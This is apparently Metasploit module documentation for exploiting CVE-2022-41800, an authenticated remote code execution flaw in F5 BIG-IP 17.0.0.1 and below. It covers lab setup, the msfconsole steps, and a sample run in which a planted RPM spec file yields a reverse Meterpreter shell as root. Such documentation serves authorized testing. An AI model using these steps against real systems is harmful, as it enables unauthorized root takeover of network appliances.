## Vulnerable Application

The vulnerable application is F5 Big-IP version 17.0.0.1 and below. It can be
downloaded as a VMWare image for free (you have to create an account) from
https://downloads.f5.com. You can register for a free 30-day trial if you like,
but it's not required to test this.

Boot the VM and set an admin password by logging in with the default credentials
(admin / admin). You'll need that password.

## Verification Steps

1. Install the application
2. Start `msfconsole`
3. Do: `use exploit/linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800`
4. Do `set RHOST <target>` / `set HttpUsername admin` / `set HttpPassword <thepasswordyouchose>`
5. Do: `run`
6. You should get a session

## Options

### `HttpUsername` / `HttpPassword`

The account to authorize as - requires console access. The `admin` account (which
is the default `HttpUsername`) works great, if you have the password.

## Scenarios

### F5 Big-IP 17.0.0.1

This should be the normal experience:

```
msf6 > use exploit/linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800
[*] No payload configured, defaulting to cmd/unix/python/meterpreter/reverse_tcp

msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > set RHOST 10.0.0.162
RHOST => 10.0.0.162

msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > set LHOST 10.0.0.179
LHOST => 10.0.0.179

msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > set HttpPassword iagotestbigip
HttpPassword => mybigippassword

msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > set VERBOSE true
VERBOSE => true

msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > exploit
[*] Started reverse TCP handler on 10.0.0.179:4444 
[*] Creating an .rpmspec file on the target...
[*] Created spec file: /var/config/rest/node/tmp/2fadbb5d-ed94-4b23-ba57-2f0d273d2bdc.spec
[*] Building the RPM to trigger the payload...
[*] Sending stage (40168 bytes) to 10.0.0.162
[+] Deleted /var/config/rest/node/tmp/2fadbb5d-ed94-4b23-ba57-2f0d273d2bdc.spec
[+] Deleted /var/config/rest/node/tmp/RPMS/noarch/wOXt3-4.1.3-0.8.6.noarch.rpm
[*] Meterpreter session 2 opened (10.0.0.179:4444 -> 10.0.0.162:38556) at 2022-11-14 15:14:23 -0800

meterpreter > getuid
Server username: root
```
